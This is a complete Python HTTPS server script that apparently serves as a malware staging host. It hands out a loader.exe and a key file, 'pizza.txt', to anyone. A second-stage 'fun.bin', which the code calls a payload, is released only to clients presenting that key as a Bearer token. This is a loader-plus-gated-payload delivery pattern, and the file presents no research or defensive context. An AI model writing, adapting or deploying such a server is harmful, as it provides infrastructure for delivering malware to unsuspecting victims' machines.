from http.server import SimpleHTTPRequestHandler, HTTPServer
import ssl

class CustomHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        # Serve pizza.txt without requiring authentication
        if self.path == "/pizza.txt":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"170")  # Replace with your actual key if needed
            return

        # Serve loader.exe without requiring authentication
        if self.path == "/loader.exe":
            try:
                with open("loader.exe", "rb") as loader_file:
                    self.send_response(200)
                    self.send_header("Content-Type", "application/octet-stream")
                    self.end_headers()
                    self.wfile.write(loader_file.read())
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"File not found: loader.exe")
            return

        # Serve fun.bin with authentication
        if self.path == "/fun.bin":
            secret_key = "170"  # Update this to match the key in pizza.txt
            auth_header = self.headers.get("Authorization")
            if auth_header != f"Bearer {secret_key}":
                self.send_response(403)  # Forbidden
                self.end_headers()
                self.wfile.write(b"Forbidden: Invalid key")
                return

            try:
                with open("fun.bin", "rb") as payload_file:
                    self.send_response(200)
                    self.send_header("Content-Type", "application/octet-stream")
                    self.end_headers()
                    self.wfile.write(payload_file.read())
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"File not found: fun.bin")
            return

        # Fallback to default handler for all other requests
        super().do_GET()

# Set up the server address and handler
server_address = ('0.0.0.0', 8443)
httpd = HTTPServer(server_address, CustomHandler)

# Create SSL context
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ssl_context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

# Wrap the socket with SSL
httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)

print("Serving HTTPS on https://0.0.0.0:8443...")
httpd.serve_forever()
